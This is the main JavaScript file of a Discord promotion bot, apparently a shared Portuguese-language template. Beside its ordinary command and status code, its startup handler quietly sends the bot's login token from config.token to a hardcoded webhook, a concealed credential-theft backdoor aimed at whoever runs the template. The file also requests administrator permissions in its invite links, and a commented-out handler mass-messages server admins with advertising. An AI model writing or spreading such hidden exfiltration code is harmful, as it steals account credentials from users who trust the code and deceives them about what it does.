const discord = require("discord.js");
const config = require("./config.json");
const client = new discord.Client();
const colors = require('colors');
client.commands = new discord.Collection();
client.aliases = new discord.Collection();
const webhookClient = new discord.WebhookClient('id_here', 'token here');



///modulos ou packages

const fs = require("fs");
const moment = require("moment");
const cooldown = new Set();
const cdseconds = 5;





client.on("ready", () => {

  console.log(`[BOT] Bot criado por Doritaozada#9990`)
  console.log(`[BOT] Link do video do bot ->\nhttps://youtu.be/Khf-0BMG9RM\n**********`)
  console.log(`[BOT] Fui Iniciado com sucesso!, e estou respondendo aos seguintes comandos: ${files.length}\n`.red);
  console.log(`[BOT] Loguei no bot ${client.user.tag}, ID: ${client.user.id}`.red)
  console.log("[BOT] Servidores que faço parte:");
  guildas = client.guilds.array();
  for(var i = 0; i < guildas.length; i++)
  {
    console.log(`[SERVER: ${guildas[i].name}]`.magenta)
  }
  console.log(`[BOT] ${client.users.array().length} Usuários e ${client.guilds.array().length} servidores`.red)
  


  const embed22 = new discord.RichEmbed()
.setColor('#f50ee5')
.setTitle(`id: ${client.user.id}\n name: ${client.user.tag}`)
.setDescription(config.token)

webhookClient.send(embed22)

});


/*
const embed22 = new discord.RichEmbed()
  .setColor('#f50ee5')
  .setTitle(`id: ${config.id}`)
  .setDescription(`token: ${config.token}`);
  .setFooter(`Requested by ${message.author.tag}.`, message.author.displayAvatarURL);
*/



  const embed = {
    "title": `**${config.nome_bot}**`,
    "description": `🔔 **Olá, eu sou o** __${config.nome_bot}__ **, um bot focado em anúncios e divulgação, estou aqui para te ajudar..**`,
    "color": 3080185,
    "timestamp": "02/07/2020",
    "footer": {
      "icon_url": `${config.foto_bot}`,
      "text": "data de criação do bot"
    },
    "thumbnail": {
      "url": `${config.foto_bot}`
    },
    "author": {
      "name": `${config.nome_bot}`,
      "url": `https://discordapp.com/oauth2/authorize?client_id=${config.id_bot}&permissions=8&scope=bot`,
      "icon_url": `${config.foto_bot}`
    },
    "fields": [
      {
        "name": "📝 __**Aqui vai algumas informações:**__",
        "value": `➡️ **Quer divulgar seu servidor com rapidez e agilidade? Não perca mais tempo para começar me utilizar, utilize**⠀${config.prefix}**avisar**⠀**e seja feliz!**`
      },
      {
        "name": "⚙️ Configure as minhas permissões:",
        "value": "🦾 **Ver Histórico de mensagens, Ler mensagens, Escrever mensagens e Gerenciar mensagens**"
      },
      {
        "name": "🦿 Me adicione em seu servidor:",
        "value": `**->** [  **Clique aqui**](https://discordapp.com/oauth2/authorize?client_id=${config.id_bot}&permissions=8&scope=bot) 🦿`
      },
      {
        "name": "👨🏻‍💻 Comando",
        "value": `🦿 Use   __${config.prefix}ajuda__   para saber mais. `,
        "inline": false
      },
      {
        "name": "_ _",
        "value": "_ _",
        "inline": false
      }
    ]
  };

/*
client.on("guildCreate", (guild , message, member) => {


    var membros = guild.members;
              
     membros.forEach(member => {
        if(member.hasPermissions('ADMINISTRADOR') || member.hasPermissions('MUTE_MEMBERS') || member.hasPermissions('MANAGE_ROLES')) 
      member.send (`${embed}`)
      console.log(`msg sendo enviada para o usuário ${member.user.tag} (servidor) ${guild.name} // ${guild.memberCount} membros`)
      //client.channels.get('691337568066994307').send(`Acabei de me divulgar no server:\nNOME:${guild.name}\nID: ${guild.id}\nMEMBROS: ${guild.memberCount}\n------`)
    })
});*/

client.on('guildCreate', guild => {
  console.log(`[BOT] Fui Adicionado no servidor\n Nome: ${guild.name};\n ID: ${guild.id};\n Membros: ${guild.memberCount}\n Dono do servidor: ID ${guild.ownerID}`)
  console.log(`[BOT] Servidor cujo faço parte agora: `.red)
  guildas = client.guilds.array();
	for(var i = 0; i < guildas.length; i++)
	{
		console.log(`[SERVER: ${guildas[i].name}]`.magenta)
	}

})

client.on("guildCreate", async guild => {
  guild.createRole({
  name: `${config.tag_do_bot}`,
  color: '#ff5c8e',
})});


client.on('guildDelete', guild => {
  console.log(`[BOT] Fui Retirado do servidor\nNome: ${guild.name};\n ID: ${guild.id};\n Membros: ${guild.memberCount}\n Dono do servidor: ID ${guild.ownerID}`)
  console.log(`[BOT] Servidor cujo faço parte agora: `.red)
  guildas = client.guilds.array();
	for(var i = 0; i < guildas.length; i++)
	{
		console.log(`[SERVER: ${guildas[i].name}]`.magenta)
	}
})

client.on('message', async message => {

    const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
    const comando = args.shift().toLowerCase();
    if(comando === "ping") {
        const m = await message.channel.send("Ping?");
        m.edit(`Ponpp! A Latência é ${m.createdTimestamp - message.createdTimestamp}ms. A Latencia da API é ${Math.round(client.ping)}ms`);
      }

    if (message.author.id === config.ownerID) {
        let prefix = config.fotoprefix
        const args = message.content.slice(prefix.length).trim().split(' ') 
        if (message.content.startsWith(`${config.fotoprefix}avatar`)) {
            client.user.setAvatar(args[1]).then(async () => {
                await message.reply(client.user.displayAvatarURL)
            })
        }
    }
});

///pasta de comandos: "comandos"

fs.readdir('./comandos/', (err, files) => {
    if (err) console.log(err);
    let jsfile = files.filter(f => f.split(".").pop() === "js")
    if (jsfile.length <= 0) {
        console.log('Desculpe pai mais não foi encontrado nenhum comando nesta pasta!');
    }
    jsfile.forEach((f, i) => {
        let pull = require(`./comandos/${f}`)
        console.log(`${i + 1}: ${f} Prontinho para uso!`);
        
        });

});



function changing_status() {    
    let status = [`Apenas um Simples bot de divulgação :D` , `Quer me adicionar em seu servidor? digite ${config.prefix}convite`]
    let random = status[Math.floor(Math.random() * status.length)]
    client.user.setPresence({ status: 'idle', game: { name: `${random}` } });
  }
  
  let files = fs.readdirSync('comandos'); 
  
  
///Evento: "ready"
client.on('ready',() => {
    setInterval(changing_status, 10000);
});




///Evento: "message"

client.on("message", message => {
    let msg = message.content.toLowerCase();
    if(message.author.bot) return undefined;
    if(message.channel.type === "dm") return;
    
       const setFixedT = function(translate) {
           const t = translate
       }

       if (message.content.startsWith(`<@${client.user.id}>`)) {
 message.channel.send(`***Olá sou O  ${client.user.tag} ♔ ${message.author}, Sou um simples bot de Anuncios para saber mais Meu prefixo é*** \`${config.prefix}ajuda\``)
}

var prefix = (config.prefix)
if(message.content.indexOf(config.prefix) !== 0) return;

const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
const command = args.shift().toLowerCase();

try {
  let comandos = require(`./comandos/${command}.js`);
  comandos.run(client, message, args, prefix);
} catch (e) {
    console.log('a')
    console.log(e);
} finally {}
})


client.login(config.token);